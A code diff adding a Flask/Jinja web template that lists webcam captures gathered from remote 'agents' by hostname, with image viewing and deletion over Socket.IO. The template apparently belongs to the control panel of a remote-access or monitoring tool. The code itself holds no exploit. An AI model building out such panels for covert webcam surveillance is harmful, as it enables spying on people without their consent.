@@ -1,0 +1,133 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="container-fluid mt-5"> 
+    <h2 class="mb-4"><i class="fas fa-camera me-2"></i>Webcam Captures</h2>
+
+    <div class="row" id="webcam-container">
+        {% for capture in captures %}
+        <div class="col-md-4 col-lg-3 mb-4 webcam-card" data-capture-id="{{ capture.id }}">
+            <div class="card shadow-sm h-100">
+                <a href="{{ base_url }}{{ url_for('get_webcam_capture', capture_id=capture.id) }}" data-lightbox="webcam">
+                    <img src="{{ base_url }}{{ url_for('get_webcam_capture', capture_id=capture.id) }}" class="card-img-top" alt="Webcam Capture">
+                </a>
+                <div class="card-body">
+                    <h6 class="card-subtitle mb-2 text-muted">
+                        {% if capture.hostname %}
+                        <a href="{{ base_url }}{{ url_for('agent_detail', agent_id=capture.agent_id) }}" class="text-decoration-none">
+                            {{ capture.hostname }}
+                        </a>
+                        {% else %}
+                        <span class="text-muted">Unknown Agent</span>
+                        {% endif %}
+                    </h6>
+                    <p class="card-text text-muted small">
+                        <i class="far fa-clock me-1"></i>{{ capture.timestamp }}
+                    </p>
+                    <button class="btn btn-sm btn-outline-danger delete-webcam" 
+                            data-capture-id="{{ capture.id }}">
+                        <i class="fas fa-trash-alt"></i> Delete
+                    </button>
+                </div>
+            </div>
+        </div>
+        {% endfor %}
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_css %}
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.3/css/lightbox.min.css">
+{% endblock %}
+
+{% block extra_js %}
+<script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.3/js/lightbox.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Initialize lightbox if available
+    if (window.lightbox) {
+        lightbox.option({
+            'resizeDuration': 200,
+            'wrapAround': true,
+            'albumLabel': "Webcam Capture %1 of %2"
+        });
+    }
+
+    // Connect to Socket.IO with error handling
+    let socket;
+    try {
+        socket = io('/webcam');
+        console.log('Socket.IO connected successfully for webcam');
+    } catch (e) {
+        console.error('Socket.IO connection failed:', e);
+        return;
+    }
+
+    // Delete handler with event delegation
+    document.getElementById('webcam-container').addEventListener('click', function(e) {
+        const deleteBtn = e.target.closest('.delete-webcam');
+        if (deleteBtn) {
+            const captureId = deleteBtn.dataset.captureId;
+            if (confirm('Are you sure you want to delete this webcam capture?')) {
+                deleteWebcamCapture(captureId, socket);
+            }
+        }
+    });
+
+    // Handle server responses
+    socket.on('webcam_capture_deleted', function(data) {
+        const card = document.querySelector(`[data-capture-id="${data.capture_id}"]`);
+        if (card) {
+            card.remove();
+            showNotification('Webcam capture deleted successfully', 'success');
+        }
+    });
+
+    async function deleteWebcamCapture(id, socket) {
+    try {
+        // First try WebSocket
+        if (socket && socket.connected) {
+            socket.emit('delete_webcam_capture', { capture_id: id });
+            return;
+        }
+        
+        // Fallback to HTTP
+        const response = await fetch(`/api/webcam_captures/${id}`, {
+            method: 'DELETE',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        });
+        
+        if (!response.ok) {
+            const error = await response.json();
+            throw new Error(error.message || 'Failed to delete webcam capture');
+        }
+        
+        // Manually remove the element if WebSocket didn't notify us
+        const card = document.querySelector(`[data-capture-id="${id}"]`);
+        if (card) {
+            card.remove();
+        }
+        showNotification('Webcam capture deleted successfully', 'success');
+        
+    } catch (error) {
+        console.error('Delete failed:', error);
+        showNotification('Delete failed: ' + error.message, 'error');
+    }
+}
+
+    function showNotification(message, type) {
+        const alert = document.createElement('div');
+        alert.className = `alert alert-${type} fixed-top mx-auto mt-3`;
+        alert.style.width = '300px';
+        alert.style.zIndex = '1000';
+        alert.textContent = message;
+        document.body.appendChild(alert);
+        setTimeout(() => alert.remove(), 3000);
+    }
+});
+</script>
+{% endblock %}
+
